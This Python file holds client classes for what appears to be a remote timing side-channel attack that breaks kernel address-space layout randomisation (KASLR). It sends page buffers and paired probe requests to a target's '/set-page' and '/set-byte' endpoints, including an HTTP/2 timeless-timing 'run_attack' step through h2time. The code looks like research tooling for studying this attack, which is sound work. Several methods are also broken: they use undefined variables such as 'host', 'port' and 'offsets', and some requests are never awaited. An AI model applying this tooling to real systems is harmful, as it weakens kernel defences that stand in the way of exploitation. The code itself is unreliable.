from abc import ABC, abstractmethod
import asyncio
import aiohttp
import requests
import numpy as np
import httpx
from h2time import H2Time, H2Request

class KASLRService(ABC):
    def __init__(self, host, port, http_version, page_buffers):
        self.host = host
        self.port = port
        self.http2 = True if http_version == 'http2' else False
        self.page_buffers = page_buffers

    @abstractmethod
    def supports_http2(self):
        return False

    @abstractmethod
    def set_offset(self, offset):
        pass

    @abstractmethod
    def set_offsets(self, offsets):
        pass

    @abstractmethod
    def try_offset(self, offset):
        pass

    @abstractmethod
    def try_offsets(self, offsets):
        pass

class KASLRServiceHTTP2(ABC):
    @abstractmethod
    def try_pair(self, pair):
        pass


class KASLRServiceRequests(KASLRService):
    def supports_http2(self):
        return False

    def set_offset(self, offset):
        url = f'http://{self.host}:{self.port}/set-page/{offset}'
        requests.post(url, data=self.page_buffers[offset])

    def set_offsets(self, offsets):
        for offset in offsets:
            self.set_offset(offset)

    def try_offset(self, offset):
        url = f'http://{self.host}:{self.port}/set-byte/{offset}'
        response = requests.post(url, data=None)

        if response.status_code != 200:
            m = [np.NaN, np.NaN]
        else:
            m = [int(x) for x in response.text.split(",")]

        return m

    def try_offsets(self, offsets):
        measurements = [0] * len(offsets)
        for idx, offset in enumerate(offsets):
            measurements[idx] = self.try_offset(offset)

        return measurements


class KASLRServiceAIOHTTP(KASLRService):
    def supports_http2(self):
        return False

    async def __set_offset(self, offset):
        async with aiohttp.ClientSession() as session:
            url = f'http://{self.host}:{self.port}/set-page/{offset}'
            session.post(url, data=self.page_buffers[offset])

    def set_offset(self, offset):
        url = f'http://{self.host}:{self.port}/set-page/{offset}'
        asyncio.run(self.__set_offset(offset))

    async def __put_page(self, session, idx, url, data):
        async with session.post(url, data=data) as response:
            await response.text()
            return (idx, response)

    async def __set_offsets(self, offsets):
        tasks = []
        async with aiohttp.ClientSession() as session:
            for idx, offset in enumerate(offsets):
                url = f'http://{self.host}:{self.port}/set-page/{offset}'
                tasks.append(
                    asyncio.ensure_future(
                        self.__put_page(session, idx, url, self.page_buffers[offset])
                    )
                )

            res = await asyncio.gather(*tasks)

    def set_offsets(self, offsets):
        asyncio.run(self.__set_offsets(offsets))

    async def __try_offset(self, offset):
        async with aiohttp.ClientSession() as session:
            url = f'http://{self.host}:{self.port}/set-byte/{offset}'
            response = await session.post(url, data=None)
            if response.status != 200:
                return [np.NaN, np.NaN]
            else:
                text = await response.text()
                return [int(x) for x in text.split(",")]

    def try_offset(self, offset):
        return asyncio.run(self.__try_offset(offset))

    async def __try_offsets(self, offsets):
        tasks = []
        async with aiohttp.ClientSession() as session:
            for idx, offset in enumerate(offsets):
                url = f'http://{self.host}:{self.port}/set-byte/{offset}'
                tasks.append(
                    asyncio.ensure_future(
                        self.__put_page(session, idx, url, None)
                    )
                )

            results = await asyncio.gather(*tasks)

            measurements = [0] * len(results)

            for result in results:
                idx, response = result
                if response.status != 200:
                    m = [np.NaN, np.NaN]
                else:
                    text = await response.text()
                    m = [int(x) for x in text.split(",")]

                measurements[idx] = m

            return measurements

    def try_offsets(self, offsets):
        return asyncio.run(self.__try_offsets(offsets))


class KASLRServiceHTTPX(KASLRService, KASLRServiceHTTP2):
    def supports_http2(self):
        return True

    def set_offset(self, offset):
        url = f'http://{host}:{port}/set-page/{offset}'
        httpx.post(url, data=self.page_buffers[offset], timeout=5)

    async def __put_page(self, client, idx, url, data):
        response = await client.post(url, data=data, timeout=5)
        return (idx, response)

    async def __set_offsets(self, offsets):
        tasks = []
        async with httpx.AsyncClient(http2=self.http2) as client:
            for idx, offset in enumerate(offsets):
                url = f'http://{self.host}:{self.port}/set-page/{offset}'
                tasks.append(
                    asyncio.ensure_future(
                        self.__put_page(client, idx, url, self.page_buffers[offset])
                    )
                )

            res = await asyncio.gather(*tasks)

    def set_offsets(self, offsets):
        asyncio.run(self.__set_offsets(offsets))

    def try_offset(self, offset):
        url = f'http://{host}:{port}/set-byte/{offset}'
        r = httpx.post(url, timeout=5)

        if r.status_code != 200:
            return [np.NaN, np.NaN]
        else:
            return [int(x) for x in r.text.split(",")]

    async def __try_offsets(self, offsets):
        tasks = []
        async with httpx.AsyncClient(http2=self.http2) as client:
            for idx, offset in enumerate(offsets):
                url = f'http://{self.host}:{self.port}/set-byte/{offset}'
                tasks.append(
                    asyncio.ensure_future(
                        self.__put_page(client, idx, url, None)
                    )
                )

            results = await asyncio.gather(*tasks)

            measurements = [0] * len(results)

            for idx, r in results:
                if r.status_code != 200:
                    m = [np.NaN, np.NaN]
                else:
                    m = [int(x) for x in r.text.split(",")]

                measurements[idx] = m

            return measurements

    def try_offsets(self, offsets):
        return asyncio.run(self.__try_offsets(offsets))

    async def __try_pair(self, pair):
        tasks = []
        async with httpx.AsyncClient(http2=True) as client:
            for idx, offset in enumerate(offsets):
                url = f'http://{self.host}:{self.port}/set-byte/{offset}'
                tasks.append(
                    asyncio.ensure_future(
                        self.__put_page(client, idx, url, None)
                    )
                )

            results = await asyncio.gather(*tasks)

            print(results)

            measurements = [0] * len(results)

            for idx, r in results:
                if r.status_code != 200:
                    m = [np.NaN, np.NaN]
                else:
                    m = [int(x) for x in r.text.split(",")]

                measurements[idx] = m

            return results[0][0]

    def try_pair(self, pair):
        return asyncio.run(self.__try_pair(pair))


class KASLRServiceH2Time(KASLRService, KASLRServiceHTTP2):
    def supports_http2(self):
        return True

    async def __set_offset(self, offset):
        async with aiohttp.ClientSession() as session:
            url = f'http://{self.host}:6666/set-page/{offset}'
            session.post(url, data=self.page_buffers[offset])

    def set_offset(self, offset):
        url = f'http://{self.host}:6666/set-page/{offset}'
        asyncio.run(self.__set_offset(offset))

    async def __put_page(self, session, idx, url, data):
        async with session.post(url, data=data) as response:
            await response.text()
            return (idx, response)

    async def __set_offsets(self, offsets):
        tasks = []
        async with aiohttp.ClientSession() as session:
            for idx, offset in enumerate(offsets):
                url = f'http://{self.host}:6666/set-page/{offset}'
                tasks.append(
                    asyncio.ensure_future(
                        self.__put_page(session, idx, url, self.page_buffers[offset])
                    )
                )

            res = await asyncio.gather(*tasks)

    def set_offsets(self, offsets):
        asyncio.run(self.__set_offsets(offsets))

    async def __try_offset(self, offset):
        async with aiohttp.ClientSession() as session:
            url = f'http://{self.host}:6666/set-byte/{offset}'
            response = await session.post(url, data=None)
            if response.status != 200:
                return [np.NaN, np.NaN]
            else:
                text = await response.text()
                return [int(x) for x in text.split(",")]

    def try_offset(self, offset):
        return asyncio.run(self.__try_offset(offset))

    async def __try_offsets(self, offsets):
        tasks = []
        async with aiohttp.ClientSession() as session:
            for idx, offset in enumerate(offsets):
                url = f'http://{self.host}:6666/set-byte/{offset}'
                tasks.append(
                    asyncio.ensure_future(
                        self.__put_page(session, idx, url, None)
                    )
                )

            results = await asyncio.gather(*tasks)

            measurements = [0] * len(results)

            for result in results:
                idx, response = result
                if response.status != 200:
                    m = [np.NaN, np.NaN]
                else:
                    text = await response.text()
                    m = [int(x) for x in text.split(",")]

                measurements[idx] = m

            return measurements

    def try_offsets(self, offsets):
        return asyncio.run(self.__try_offsets(offsets))

    async def __try_pair(self, pair):
        offset1, offset2 = pair
        url_1 = f'http://{self.host}:{self.port}/set-byte/{offset1}'
        url_2 = f'http://{self.host}:{self.port}/set-byte/{offset2}'

        r1 = H2Request('POST', url_1, {'user-agent': 'm'})
        r2 = H2Request('POST', url_2, {'user-agent': 'm'})

        async with H2Time(r1, r2, sequential=False, num_request_pairs=1, num_padding_params=40, inter_request_time_ms=0) as h2t:
            results = await h2t.run_attack()

        offset = offset2
        if results[0][0] < 0:
            offset = offset1

        return offset

    def try_pair(self, pair):
        return asyncio.run(self.__try_pair(pair))
